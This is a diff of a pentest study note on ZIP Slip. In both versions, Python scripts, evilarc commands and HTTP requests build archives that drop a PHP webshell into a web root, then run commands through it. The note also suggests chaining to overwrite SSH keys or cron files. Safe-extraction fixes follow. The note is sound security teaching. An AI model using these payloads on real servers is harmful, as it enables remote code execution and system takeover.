@@ -5,211 +5,144 @@ module: "22 - File Upload"
 topic: "22.11 ZIP Slip (malicious ZIP with path traversal)"
 ---
 
-# 22.11 — ZIP Slip (malicious ZIP with path traversal)
+# 22.11 — ZIP Slip (Malicious ZIP with Path Traversal)
 
-## What Is ZIP Slip?
+## What is it?
+ZIP Slip is a directory traversal vulnerability that occurs when extracting files from a malicious archive (like a `.zip`, `.tar.gz`, or `.rar`). Normally, a ZIP file contains a list of filenames and their data. When an application extracts the archive, it trusts the filenames inside. However, the ZIP format allows filenames to contain path traversal characters (like `../`).
 
+If an attacker creates a ZIP containing a file named `../../../../var/www/html/shell.php` and uploads it, a vulnerable application will extract that file not in the intended `uploads/` directory, but right into the web root. This allows an attacker to overwrite critical system files, upload webshells, or place configuration files anywhere the application's user has write permissions.
+
+Think of it like accepting a delivery box where one of the items inside is labeled "Put this item in the bank vault". If you just blindly follow the label without checking if the sender is authorized, the item ends up where it shouldn't.
+
+## ASCII Diagram
+```text
+NORMAL EXTRACTION:
+┌───────────────────────────┐         ┌─────────────────────────┐
+│       archive.zip         │         │ Server File System      │
+├───────────────────────────┤         ├─────────────────────────┤
+│ entry: index.html         │ ──────> │ /app/uploads/index.html │
+│ entry: images/logo.png    │         │ /app/uploads/images/... │
+└───────────────────────────┘         └─────────────────────────┘
+
+MALICIOUS EXTRACTION (ZIP SLIP):
+┌───────────────────────────┐         ┌─────────────────────────┐
+│     malicious.zip         │         │ Server File System      │
+├───────────────────────────┤         ├─────────────────────────┤
+│ entry: ../../shell.php    │ ───┬──> │ /app/uploads/... (SKIP) │
+│ entry: normal.txt         │    │    │                         │
+└───────────────────────────┘    └──> │ /app/shell.php (DANGER) │
+                                      └─────────────────────────┘
 ```
-ZIP SLIP:
-  A directory traversal attack via malicious archive file
+
+## How to Find It
+- **Manual steps:**
+  1. Identify any functionality that accepts archive files (`.zip`, `.tar`, `.tar.gz`, etc.). Common places include "Import Theme", "Bulk Image Upload", or "Restore Backup" features.
+  2. Create a test archive containing a file with a traversal path, such as `../zipslip_test.txt`.
+  3. Upload the archive.
+  4. Attempt to access the file at the parent directory of the intended upload path (e.g., `https://target.com/zipslip_test.txt`). If the file is accessible, the application is vulnerable.
+
+- **Tool commands with flags explained:**
+  To generate a test ZIP file locally using Python:
+  ```bash
+  python3 -c "
+  import zipfile
+  with zipfile.ZipFile('test.zip', 'w') as z:
+      # Write a file with a traversal path
+      z.writestr('../zipslip_test.txt', 'ZIP_SLIP_VULNERABLE')
+  "
+  ```
+  Alternatively, use the `evilarc` tool specifically designed for this:
+  ```bash
+  # Install evilarc
+  pip install evilarc
   
-  NORMAL ZIP ENTRY:
-  index.html → extracted to: /upload/extracted/index.html
-  
-  MALICIOUS ZIP ENTRY:
-  ../../shell.php → extracted to: /upload/extracted/../../shell.php
-                                 → resolves to: /shell.php (web root!)
-  
-  IF APP DOESN'T SANITIZE ENTRY NAMES:
-  Extracted file ends up OUTSIDE the intended extraction directory!
-  → Write any file anywhere the server process has write permission!
-  
-  IMPACT:
-  - Write a webshell to web root → RCE
-  - Overwrite configuration files → code execution or credential change
-  - Overwrite cron jobs → scheduled execution
-  - Overwrite authorized_keys → SSH access
-  
-  CVE: ZIP Slip affects hundreds of libraries and apps
-  Disclosed by Snyk in 2018
-  Affected: Java (Apache Commons Compress, Plexus Archiver, etc.),
-             Ruby, Node, Python, Go, .NET
-```
+  # Create a zip with shell.php packed 3 directories deep
+  # -o: output file
+  # -p: path to prepend
+  # -d: depth (how many ../ to add)
+  # --os: target OS (unix/win)
+  python evilarc.py shell.php -o zipslip.zip -p ../../../ -d 3 --os unix
+  ```
 
----
+## How to Exploit It
+- **Step-by-step walkthrough:**
+  1. Prepare your malicious payload (e.g., a PHP webshell named `shell.php`).
+  2. Create the malicious ZIP using a script, placing `shell.php` at a traversal path (e.g., `../../../../var/www/html/shell.php`).
+  3. Upload the ZIP file to the vulnerable endpoint.
+  4. The server extracts the ZIP. Due to the path traversal characters, the file is dropped into the target directory (e.g., `/var/www/html/`).
+  5. Navigate to the uploaded shell (e.g., `https://target.com/shell.php?cmd=id`) to execute arbitrary commands.
 
-## Creating a Malicious ZIP
+- **Actual payloads:**
+  **Python script to craft targeted ZIP payload:**
+  ```python
+  import zipfile
 
-```bash
-# METHOD 1: USING PYTHON:
-python3 << 'EOF'
-import zipfile
+  payload = '<?php system($_GET["cmd"]); ?>'
+  with zipfile.ZipFile('payload.zip', 'w') as zf:
+      # Add a harmless file to trick superficial checks
+      zf.writestr('legitimate.txt', 'Normal file data')
+      # Add the malicious file aiming for the web root
+      zf.writestr('../../../../../var/www/html/shell.php', payload)
+  ```
 
-with zipfile.ZipFile('zipslip.zip', 'w') as zf:
-    # Normal file (to look legitimate):
-    zf.writestr('legitimate.txt', 'This is a normal file')
-    
-    # Malicious traversal entries:
-    zf.writestr('../shell.php', '<?php system($_GET["cmd"]); ?>')
-    zf.writestr('../../web_root_shell.php', '<?php system($_GET["cmd"]); ?>')
-    zf.writestr('../../../tmp/shell.php', '<?php system($_GET["cmd"]); ?>')
-    
-    # Overwrite specific file:
-    zf.writestr('../index.php', '<?php system($_GET["cmd"]); ?>')  # overwrite index!
-EOF
+- **Real HTTP request/response examples:**
+  **Upload Request:**
+  ```http
+  POST /api/upload-theme HTTP/1.1
+  Host: target.com
+  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
-# METHOD 2: EVILARC TOOL:
-pip install evilarc
-python evilarc.py shell.php -o zipslip.zip -p ../../../ -d 3 --os unix
-# Creates ZIP with shell.php at path: ../../../shell.php
+  ------WebKitFormBoundary
+  Content-Disposition: form-data; name="theme_archive"; filename="payload.zip"
+  Content-Type: application/zip
 
-# METHOD 3: MANUAL WITH ZIP COMMAND (Linux):
-# Create directory structure mimicking traversal:
-mkdir -p "malicious_zip/path"
-echo '<?php system($_GET["cmd"]); ?>' > "malicious_zip/../../shell.php"
-# Note: Linux won't actually create ../../, need Python or evilarc
+  PK\x03\x04... [Binary ZIP Data containing ../../../../../var/www/html/shell.php] ...
+  ------WebKitFormBoundary--
+  ```
+  **Execution Request:**
+  ```http
+  GET /shell.php?cmd=whoami HTTP/1.1
+  Host: target.com
 
-# VERIFY THE ZIP CONTAINS TRAVERSAL ENTRIES:
-python3 -c "
-import zipfile
-with zipfile.ZipFile('zipslip.zip') as z:
-    for name in z.namelist():
-        print(name)
-"
-# Should show: ../shell.php etc.
+  HTTP/1.1 200 OK
+  www-data
+  ```
 
-# TARGET-SPECIFIC:
-# If you know the target web root:
-python3 << 'EOF'
-import zipfile
-payload = '<?php system($_GET["cmd"]); ?>'
-# Target path (adjust based on target):
-with zipfile.ZipFile('targeted.zip', 'w') as zf:
-    zf.writestr('normal.txt', 'Normal file')
-    zf.writestr('../../../../var/www/html/shell.php', payload)
-    zf.writestr('../../../../var/www/html/uploads/shell.php', payload)
-    zf.writestr('../shell.php', payload)
-    zf.writestr('../../shell.php', payload)
-EOF
-```
+## Real-World Example
+In 2018, Snyk disclosed the "ZIP Slip" vulnerability affecting thousands of projects across multiple ecosystems (Java, JavaScript, Python, Ruby). One notable affected application was HP's Device Manager. Attackers uploaded a malicious ZIP file disguised as a system update. Because the extraction routine used Java's native `java.util.zip` without validating the entry names, the attacker was able to place a malicious script directly into the application's executable directory, achieving unauthenticated Remote Code Execution (RCE).
 
----
+## How to Fix It
+- **Developer remediation:**
+  Never trust the filenames inside an archive. Before writing the extracted file to disk, you must resolve the absolute path of the destination and verify that it falls entirely within your intended extraction directory.
 
-## Testing for ZIP Slip
+- **Code snippet:**
+  **Safe Extraction in Python:**
+  ```python
+  import zipfile
+  import os
 
-```bash
-# STEP 1: FIND ZIP/ARCHIVE UPLOAD FUNCTIONALITY:
-# - "Upload ZIP file" features
-# - "Import archive" functionality
-# - "Backup restore" with ZIP
-# - Plugin/theme upload (WordPress, etc.)
-# - Asset bundle upload
+  def safe_extract(zip_file_path, extract_to_dir):
+      # Get the absolute, resolved path of the target directory
+      target_dir = os.path.realpath(extract_to_dir)
+      
+      with zipfile.ZipFile(zip_file_path) as zf:
+          for entry in zf.namelist():
+              # Construct the full path of the file to extract
+              entry_path = os.path.realpath(os.path.join(target_dir, entry))
+              
+              # Ensure the resolved path strictly starts with the target directory
+              if not entry_path.startswith(target_dir + os.sep):
+                  raise ValueError(f"Security Alert: ZIP Slip detected for entry: {entry}")
+              
+              # Safe to extract
+              zf.extract(entry, target_dir)
+  ```
 
-# STEP 2: CREATE MALICIOUS ZIP:
-python3 -c "
-import zipfile
-with zipfile.ZipFile('test.zip', 'w') as z:
-    z.writestr('../zipslip_test.txt', 'ZIP_SLIP_TEST')
-    z.writestr('normal.txt', 'normal')
-"
-
-# STEP 3: UPLOAD AND CHECK:
-curl -X POST https://target.com/upload-zip \
-  -b "session=SESSION" \
-  -F "archive=@test.zip"
-
-# STEP 4: CHECK IF FILE WAS WRITTEN OUTSIDE EXPECTED DIR:
-curl https://target.com/zipslip_test.txt
-# → "ZIP_SLIP_TEST"? → ZIP Slip vulnerability!
-
-# STEP 5: IF VULNERABLE → UPLOAD WEBSHELL ZIP:
-curl -X POST https://target.com/upload-zip \
-  -b "session=SESSION" \
-  -F "archive=@zipslip.zip"
-
-# STEP 6: ACCESS WEBSHELL:
-curl "https://target.com/shell.php?cmd=id"
-# → uid=...? → RCE via ZIP Slip!
-
-# BONUS: TAR SLIP (same attack via .tar.gz):
-python3 << 'EOF'
-import tarfile, io
-
-payload = b'<?php system($_GET["cmd"]); ?>'
-info = tarfile.TarInfo(name='../../web_shell.php')
-info.size = len(payload)
-
-with tarfile.open('tarslip.tar.gz', 'w:gz') as t:
-    t.addfile(info, io.BytesIO(payload))
-EOF
-```
-
----
-
-## Fix
-
-```
-PREVENTING ZIP SLIP:
-
-1. SANITIZE ENTRY NAMES BEFORE EXTRACTION:
-   
-   Python (safe extraction):
-   import zipfile, os
-   
-   def safe_extract(zip_file, target_dir):
-       target_dir = os.path.realpath(target_dir)
-       
-       with zipfile.ZipFile(zip_file) as z:
-           for entry in z.namelist():
-               # Compute the target path:
-               entry_path = os.path.realpath(os.path.join(target_dir, entry))
-               
-               # Ensure it's inside target_dir:
-               if not entry_path.startswith(target_dir + os.sep):
-                   raise ValueError(f"ZIP Slip detected: {entry}")
-               
-               # Extract safely:
-               z.extract(entry, target_dir)
-   
-   Java (safe extraction):
-   for (ZipEntry entry : entries) {
-       File destFile = new File(destDir, entry.getName());
-       String destPath = destFile.getCanonicalPath();
-       String destDirPath = destDir.getCanonicalPath() + File.separator;
-       
-       if (!destPath.startsWith(destDirPath)) {
-           throw new IOException("Entry is outside of the target dir: " + entry.getName());
-       }
-   }
-
-2. VALIDATE ENTRY NAMES EXPLICITLY:
-   # Reject entries with:
-   for entry in zip_entries:
-       if '..' in entry or entry.startswith('/'):
-           reject(f"Dangerous path in ZIP: {entry}")
-
-3. USE SECURITY-AUDITED LIBRARIES:
-   Python: zipfile module is safe if you validate before extracting
-   Java: Use Apache Commons Compress with path validation
-   Node: unzipper with path check middleware
-   
-4. EXTRACT TO ISOLATED DIRECTORY:
-   tmp_dir = tempfile.mkdtemp()  # temp dir with random name
-   safe_extract(zip_file, tmp_dir)
-   # Process files from tmp_dir
-   # Move only validated/needed files to actual destination
-   shutil.rmtree(tmp_dir)  # Clean up
-   
-5. DISABLE EXTRACTION OF SYMLINKS:
-   Symlinks in ZIP can also escape target directory!
-   Check for and reject symlink entries:
-   if os.path.islink(extracted_file):
-       os.remove(extracted_file)  # Remove symlink
-```
-
----
+## Chaining Opportunities
+- This vuln + [[Missing File Permissions / Sudo Privileges]] → If the web server runs as a privileged user (e.g., `root`), use ZIP Slip to overwrite `/root/.ssh/authorized_keys` or `/etc/cron.d/malicious_cron` to instantly gain persistence and root-level RCE.
+- This vuln + [[Insecure Direct Object Reference (IDOR)]] → If upload paths are predictable but separated per user (e.g., `/uploads/user_123/`), use ZIP Slip to traverse out and overwrite another user's files (`../user_456/avatar.jpg`).
 
 ## Related Notes
-- [[07 - File Upload + Path Traversal]] — path traversal in filename
-- [[14 - Overwriting Existing Files]] — overwriting files via upload
-- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
+- [[07 - File Upload + Path Traversal]]
+- [[14 - Overwriting Existing Files]]
+- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
